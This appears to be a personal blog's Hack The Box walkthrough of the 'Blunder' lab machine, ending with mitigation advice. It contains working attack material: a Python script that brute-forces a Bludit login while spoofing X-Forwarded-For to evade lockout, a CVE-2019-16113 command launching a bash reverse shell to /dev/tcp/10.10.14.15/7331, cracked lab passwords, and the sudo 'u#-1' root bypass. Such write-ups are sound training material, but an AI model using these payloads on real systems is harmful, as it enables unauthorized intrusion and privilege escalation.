@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.74.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>HTB Blunder&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.ab321a2ad61315bebb72e6e3fa1108c4e8ffe4eada5cf5f20131d183a523496246d761df8fc832549be5b9dd47c40509.css" integrity="sha384-qzIaKtYTFb67cubj&#43;hEIxOj/5OraXPXyATHRg6UjSWJG12Hfj8gyVJvlud1HxAUJ"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="HTB Blunder" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><span class="site name">The Wolf Den</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/ctf-writeups">CTF Writeups</a><a class="nav item" href="/htb-writeups">HTB Writeups</a><a class="nav item" href="/about">About</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">HTB Blunder</h1><p class="article date">2020-10-17</p></section><article class="article markdown-body"><p><img  src="/img/Blunder_Logo.png"
+        alt="Blunder Logo"/></p>
+<p>Blunder is a box that starts with a Bludit based blog being used to store random facts and a Sudoers file was configured with the intent to prevent us from running bash as root. It was less than sucessful.</p>
+<h2 id="scanning-and-enumeration">Scanning and Enumeration</h2>
+<p>We start off with a basic nmap scan.</p>
+<pre><code>sudo nmap  -sV -sC 10.10.10.191                                                                                                                                                                            
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-21 08:44 MDT                                                                       
+Nmap scan report for 10.10.10.191                                                                                                     
+Host is up (0.11s latency).                                                                                                           
+Not shown: 998 filtered ports                                                                                                         
+PORT   STATE  SERVICE VERSION                                                                                                         
+21/tcp closed ftp                                                                                                                     
+80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))                                                                                  
+|_http-generator: Blunder                                                                                                             
+|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                          
+|_http-title: Blunder | A blunder of interesting facts                                                                                
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                        
+Nmap done: 1 IP address (1 host up) scanned in 23.07 seconds
+</code></pre><p>We can see there is FTP on port 21, however that port is closed so there isn&rsquo;t anything we can do with that.
+That leaves us with port 80. Seems to be running a web page, a &ldquo;Blunder of interesting facts&rdquo;</p>
+<p>Navigating to the page itself doesn&rsquo;t reveal anything that seems useful so it is time to pull out GoBuster.</p>
+<p>Other than the main page, GoBuster finds two items of interest. <code>/admin</code> and  <code>/todo.txt</code></p>
+<p><code>/admin</code> is a takes us to a bludit CMS login. We try to find and login with default credentials but are unsuccessful. We are however able to find
+the version is Bludit 3.2, which will be useful latter.</p>
+<p>We then check out <code>/todo.txt</code> and find some rather helpful information.</p>
+<pre><code>-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+</code></pre><h2 id="foothold">Foothold</h2>
+<p>Now we know that FTP being inaccessible is intentional. Old users might be referring to the default login details we tried so also not too helpful.
+&ldquo;fergus&rdquo; though. That is interesting. Maybe that happens to be a username we can use to log in? With no password at hand, we are left to try and
+bruteforce our way in. Unfortunately, if we just try passwords over and over with our just discovered username we shortly end up blocked. :-(</p>
+<p>At this point we start googling and we discover there is in fact a vulnerability in how Bludit detects bruteforcing. (<a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">https://rastating.github.io/bludit-brute-force-mitigation-bypass/</a>) Specifically, it trusts the Client-IP header
+of a request to be accurate enabling it to block request from IPs it determines to be malicious. The problem? We can alter that header.</p>
+<p>This was patched in a Bludit 3.9.3. However, our target is Bludit 3.9.2 and still vulnerable. Now that we have a way to not get locked out, we just need a wordlist.</p>
+<p>We make use of a handy tool called Cewl in order to create a custom wordlist to. We then plug it in to our script and let it loose. (I have removed the wordlist to keep you from having to scroll forever.)</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">import</span> re
+<span style="color:#f92672">import</span> requests
+
+host <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://10.10.10.191&#39;</span>
+login_url <span style="color:#f92672">=</span> host <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;/admin/login&#39;</span>
+username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;fergus&#39;</span>
+wordlist <span style="color:#f92672">=</span> [Custom Wordlist goes here]
+
+<span style="color:#75715e"># Generate 50 incorrect passwords</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">50</span>):
+    wordlist<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;Password{i}&#39;</span><span style="color:#f92672">.</span>format(i <span style="color:#f92672">=</span> i))
+
+<span style="color:#75715e"># Add the correct password to the end of the list</span>
+wordlist<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;adminadmin&#39;</span>)
+
+<span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> wordlist:
+    session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+    login_page <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(login_url)
+    csrf_token <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;</span>, login_page<span style="color:#f92672">.</span>text)<span style="color:#f92672">.</span>group(<span style="color:#ae81ff">1</span>)
+
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;[*] Trying: {p}&#39;</span><span style="color:#f92672">.</span>format(p <span style="color:#f92672">=</span> password))
+
+    headers <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#39;X-Forwarded-For&#39;</span>: password,
+        <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#39;</span>,
+        <span style="color:#e6db74">&#39;Referer&#39;</span>: login_url
+    }
+
+    data <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#39;tokenCSRF&#39;</span>: csrf_token,
+        <span style="color:#e6db74">&#39;username&#39;</span>: username,
+        <span style="color:#e6db74">&#39;password&#39;</span>: password,
+        <span style="color:#e6db74">&#39;save&#39;</span>: <span style="color:#e6db74">&#39;&#39;</span>
+    }
+
+    login_result <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>post(login_url, headers <span style="color:#f92672">=</span> headers, data <span style="color:#f92672">=</span> data, allow_redirects <span style="color:#f92672">=</span> False)
+
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;location&#39;</span> <span style="color:#f92672">in</span> login_result<span style="color:#f92672">.</span>headers:
+        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;/admin/dashboard&#39;</span> <span style="color:#f92672">in</span> login_result<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;location&#39;</span>]:
+            <span style="color:#66d9ef">print</span>()
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;SUCCESS: Password found!&#39;</span>)
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Use {u}:{p} to login.&#39;</span><span style="color:#f92672">.</span>format(u <span style="color:#f92672">=</span> username, p <span style="color:#f92672">=</span> password))
+            <span style="color:#66d9ef">print</span>()
+            <span style="color:#66d9ef">break</span>
+
+</code></pre></div><p>We run the script and not long after, we have password. <code>RolandDeschain</code></p>
+<h2 id="shell">Shell</h2>
+<p>It&rsquo;s now time to take a crack at getting a shell. We have credentials which opens the  opportunity for us to make use of CVE-2019-16113, which allows for the upload and execution
+of arbitrary PHP code. There is a Metasploit module however it is also easy enough to find a separate PoC such as this one. <a href="https://github.com/cybervaca/CVE-2019-16113">https://github.com/cybervaca/CVE-2019-16113</a></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 CVE-2019-16113-master/CVE-2019-16113.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c <span style="color:#e6db74">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.15/7331 0&gt;&amp;1&#39;&#34;</span>
+</code></pre></div><p>We catch our shell and attempt to stabilize it. I used PwnCat, which is a cool little project put together by Caleb Stewart and John Hammond. There is a GitHub and a talk recorded from GrimmCon that I highly recommend you check out. <a href="https://github.com/calebstewart/pwncat">https://github.com/calebstewart/pwncat</a></p>
+<p><code>pwncat -l -p 7331</code></p>
+<h2 id="usertxt">User.txt</h2>
+<p>Some quick enumeration shows that we are www-data and don&rsquo;t seem to have any low hanging fruit in reach. We are able to find user.txt in /home/hugo but we lack the
+permissions to read it. I got stuck here for a bit. Ran around all over the box, crashed a few shells, ran linpeas, and missed what had been sitting in front my nose
+the whole time.</p>
+<p>All the files  to run Bludit are on the box including, the config file that sets up user accounts and login details. <code>/var/www-data//bludit-3.9.2/bl-content/databases/users.php</code>  It contains the hash and salt for an <code>admin</code> of the Bludit site.</p>
+<p><img  src="/img/Blunder_BluditUsersphp.png"
+        alt/></p>
+<p>We copy this hash over to our host and run it through hash identifier. It comes back as sha-1. We spend some time trying to crack it but are unsuccessful.</p>
+<p>We got back to enumerating on the box and find a config file for an older version of Bludit. <code>/var/www-data//bludit-3.9.1/bl-content/databases/users.php</code> It contains the hash for the user Hugo, <code>faca404fd5c0a31cf187b823c695c85cffeb98d</code> There is no salt in this case though it is also sha1. How convenient. We run it through crackstation and we get a match.  <code>Password120</code></p>
+<p>Seems we have a robust password policy here.</p>
+<p>We try to su to hugo and are successful! We claim user.txt and head on to root.</p>
+<h2 id="roottxt">Root.txt</h2>
+<p>We start some basic enumeration and find that we are specifically <em>not</em> allowed to run /bin/bash as root. Very unfortunate.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"> <span style="color:#f92672">(</span>ALL, !root<span style="color:#f92672">)</span> /bin/bash
+</code></pre></div><p>However, there is a rather nasty bug. This box has a sudo version vulnerable to CVE-2019-14287. (<a href="https://www.exploit-db.com/exploits/47502">https://www.exploit-db.com/exploits/47502</a>) From the description,
+&ldquo;Sudo doesn&rsquo;t check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv
+-u#-1 returns as 0 which is root&rsquo;s id&rdquo;</p>
+<p>We run,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo -u#-1 /bin/bash
+</code></pre></div><p>And just like that we are root.</p>
+<h2 id="mitigation">Mitigation</h2>
+<p>Here are some things that could have prevented this box form being compromised in a real world scenario.</p>
+<ul>
+<li>First, don&rsquo;t leave internal files where users can get to them. The ToDo list could have been stored in so many other places on the machine rather than within the web directory.</li>
+<li>Second, is to keep systems patched. This has been said forever and probably will apply to lots of HTB boxes but an updated system could have kept me locked out both from the foothold and the privesc to root.</li>
+<li>Lastly, don&rsquo;t have shared credentials for accounts (And have a strong password) even those on the same machine. Because the Bludit Admin password was the same as Hugo&rsquo;s and easy to crack I was able to achieve user permissions.</li>
+</ul>
+<h2 id="wrap-up">Wrap up</h2>
+<p>This was my first HTB Box in about 8 months and I really enjoyed it. Some aspects of the foothold felt a bit guessy and root felt almost too easy. It was about 2 minutes from user to root. Overall though, I enjoyed the box. Thanks to egotisticalSW for creating it.</p>
+</article></div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/posts/buff-writeup/"><span class="iconfont icon-article"></span>HTB Buff</a></p><p><a class="link" href="/posts/admirer-writeup/"><span class="iconfont icon-article"></span>HTB Admirer</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">The Wolf Den</p>
+    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank">Notepadium</a></p></div></section></body>
+
+</html>
